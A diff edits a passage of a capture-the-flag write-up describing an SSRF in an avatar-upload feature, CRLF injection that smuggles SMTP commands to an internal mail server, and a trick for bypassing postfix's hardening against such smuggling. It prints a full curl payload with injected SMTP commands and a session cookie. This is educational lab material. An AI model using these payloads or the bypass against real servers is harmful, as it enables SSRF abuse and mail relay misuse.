@@ -77,7 +77,7 @@ race()
 We basically fire 100 threads for each of 2 sessions and try to buy level with them.
 We managed to get lvl 31 on one account and 32 on another, which is above 30, so it worked fine.
 Once this is done a new link appears in the user profile page - upload your avatar.
-We can either upload a local file, which was broken for large part of the CTF, or provide a link and server downloads the picture via python requests.
+We can either upload a local file, which was broken for large part of the CTF, or provide a link and server downloads the picture via python urllib.
 The latter option means we actually have SSRF!
 
 ## SSRF
@@ -95,7 +95,7 @@ We tested this locally, and it seemed just fine, we could inject headers via new
 So we tried sending:
 
 ```
-curl 'web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar' -H 'Cookie: session=eyJ1aWQiOjE2NX0.DjfNgg.FM5Rbzw1uSiBvKx5L7YUoFpJsGk' --data 'url=https://127.0.0.2%0d%0aHELO 127.0.0.2%0aMAIL FROM: <A@B.C>%0aRCPT TO: <SHALOM@P4.TEAM>%0aDATA%0aFROM: AAA@B.C%0aTO: SHALOM@P4.TEAM%0aSUBJECT: GIB%0d%0a.%0d%0a%0aQUIT%0a:25&action=save'
+curl 'web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar' -H 'Cookie: session=eyJ1aWQiOjE2NX0.DjfNgg.FM5Rbzw1uSiBvKx5L7YUoFpJsGk' --data 'url=http://127.0.0.2%0d%0aHELO 127.0.0.2%0aMAIL FROM: <A@B.C>%0aRCPT TO: <SHALOM@P4.TEAM>%0aDATA%0aFROM: AAA@B.C%0aTO: SHALOM@P4.TEAM%0aSUBJECT: GIB%0d%0a.%0d%0a%0aQUIT%0a:25&action=save'
 ```
 
 But for some reason we got no emails from the server...
@@ -121,7 +121,7 @@ Our mistake was missing the special case implemented in postfix:
 ```
 
 There is a hardening which targets exactly what we wanted to do - using HTTP request with injected headers to smuggle SMTP commands.
-The way to bypass this was to use `https` instead of `http`, because in such case the initial part of the request will actually be encrypted, and SMTP will ignore it, and the URL will be in plaintext so the server will receive nice set of SMTP commands.
+The way to bypass this was to use `https` instead of `http`, because in such case the initial part of the request will actually be encrypted, and SMTP will ignore it, and the Host will be in plaintext so the server will receive nice set of SMTP commands.
 So is we instead send:
 
 ```
